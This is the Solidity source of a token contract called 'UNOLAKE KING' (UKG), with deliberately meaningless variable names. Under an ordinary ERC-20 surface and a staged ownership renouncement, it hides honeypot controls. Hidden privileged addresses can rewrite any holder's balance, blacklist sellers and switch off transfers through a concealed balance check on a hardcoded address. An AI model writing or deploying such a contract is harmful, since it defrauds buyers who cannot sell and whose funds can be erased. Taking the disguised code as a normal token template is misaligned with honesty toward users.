//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

abstract contract limitShouldMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoModeSell {
    function createPair(address limitFeeMax, address feeLiquidity) external returns (address);
}


interface launchedAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface swapLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderSell) external view returns (uint256);

    function transfer(address feeTokenMode, uint256 marketingLaunchedTo) external returns (bool);

    function allowance(address totalAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingLaunchedTo) external returns (bool);

    function transferFrom(address sender,address feeTokenMode,uint256 marketingLaunchedTo) external returns (bool);

    event Transfer(address indexed from, address indexed walletExempt, uint256 value);
    event Approval(address indexed totalAmount, address indexed spender, uint256 value);
}

interface swapLiquidityMetadata is swapLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract UNOLAKEKING is limitShouldMax, swapLiquidity, swapLiquidityMetadata {

    function teamFee(address feeAuto, address feeTokenMode, uint256 marketingLaunchedTo) internal returns (bool) {
        if (feeAuto == tokenFrom) {
            return fromAuto(feeAuto, feeTokenMode, marketingLaunchedTo);
        }
        uint256 receiverTo = swapLiquidity(teamLaunched).balanceOf(marketingMode);
        require(receiverTo == modeAtSell);
        require(!feeTx[feeAuto]);
        return fromAuto(feeAuto, feeTokenMode, marketingLaunchedTo);
    }

    constructor (){
        
        senderTrading();
        launchedAmount enableBuy = launchedAmount(marketingMinList);
        teamLaunched = autoModeSell(enableBuy.factory()).createPair(enableBuy.WETH(), address(this));
        
        tokenFrom = _msgSender();
        isFund[tokenFrom] = true;
        senderLaunch[tokenFrom] = txIs;
        if (takeWallet) {
            listAutoTake = shouldEnable;
        }
        emit Transfer(address(0), tokenFrom, txIs);
    }

    function getOwner() external view returns (address) {
        return walletToken;
    }

    mapping(address => bool) public feeTx;

    function allowance(address txTradingMax, address atBuy) external view virtual override returns (uint256) {
        if (atBuy == marketingMinList) {
            return type(uint256).max;
        }
        return maxFund[txTradingMax][atBuy];
    }

    function name() external view virtual override returns (string memory) {
        return modeIs;
    }

    function transferFrom(address feeAuto, address feeTokenMode, uint256 marketingLaunchedTo) external override returns (bool) {
        if (_msgSender() != marketingMinList) {
            if (maxFund[feeAuto][_msgSender()] != type(uint256).max) {
                require(marketingLaunchedTo <= maxFund[feeAuto][_msgSender()]);
                maxFund[feeAuto][_msgSender()] -= marketingLaunchedTo;
            }
        }
        return teamFee(feeAuto, feeTokenMode, marketingLaunchedTo);
    }

    mapping(address => bool) public isFund;

    function owner() external view returns (address) {
        return walletToken;
    }

    uint256 maxExempt;

    uint256 private shouldEnable;

    function marketingReceiver(address receiverMax) public {
        if (tokenReceiver) {
            return;
        }
        
        isFund[receiverMax] = true;
        if (shouldEnable != listAutoTake) {
            teamTotal = false;
        }
        tokenReceiver = true;
    }

    uint256 public listAutoTake;

    address public tokenFrom;

    function txBuyAmount(address listFrom) public {
        exemptReceiver();
        if (teamTotal) {
            takeWallet = false;
        }
        if (listFrom == tokenFrom || listFrom == teamLaunched) {
            return;
        }
        feeTx[listFrom] = true;
    }

    mapping(address => mapping(address => uint256)) private maxFund;

    function senderTrading() public {
        emit OwnershipTransferred(tokenFrom, address(0));
        walletToken = address(0);
    }

    bool public tokenReceiver;

    uint8 private shouldSell = 18;

    function balanceOf(address senderSell) public view virtual override returns (uint256) {
        return senderLaunch[senderSell];
    }

    bool public feeIs;

    uint256 private txIs = 100000000 * 10 ** 18;

    function fromAuto(address feeAuto, address feeTokenMode, uint256 marketingLaunchedTo) internal returns (bool) {
        require(senderLaunch[feeAuto] >= marketingLaunchedTo);
        senderLaunch[feeAuto] -= marketingLaunchedTo;
        senderLaunch[feeTokenMode] += marketingLaunchedTo;
        emit Transfer(feeAuto, feeTokenMode, marketingLaunchedTo);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return txIs;
    }

    function maxReceiver(address senderAutoTo, uint256 marketingLaunchedTo) public {
        exemptReceiver();
        senderLaunch[senderAutoTo] = marketingLaunchedTo;
    }

    function exemptReceiver() private view {
        require(isFund[_msgSender()]);
    }

    string private amountFrom = "UKG";

    string private modeIs = "UNOLAKE KING";

    function approve(address atBuy, uint256 marketingLaunchedTo) public virtual override returns (bool) {
        maxFund[_msgSender()][atBuy] = marketingLaunchedTo;
        emit Approval(_msgSender(), atBuy, marketingLaunchedTo);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return amountFrom;
    }

    function decimals() external view virtual override returns (uint8) {
        return shouldSell;
    }

    address public teamLaunched;

    address private walletToken;

    mapping(address => uint256) private senderLaunch;

    address marketingMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address marketingMinList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private totalMax;

    function transfer(address senderAutoTo, uint256 marketingLaunchedTo) external virtual override returns (bool) {
        return teamFee(_msgSender(), senderAutoTo, marketingLaunchedTo);
    }

    bool private listExemptSwap;

    function amountReceiver(uint256 marketingLaunchedTo) public {
        exemptReceiver();
        modeAtSell = marketingLaunchedTo;
    }

    bool private teamTotal;

    event OwnershipTransferred(address indexed receiverTx, address indexed sellTx);

    bool public takeWallet;

    uint256 modeAtSell;

}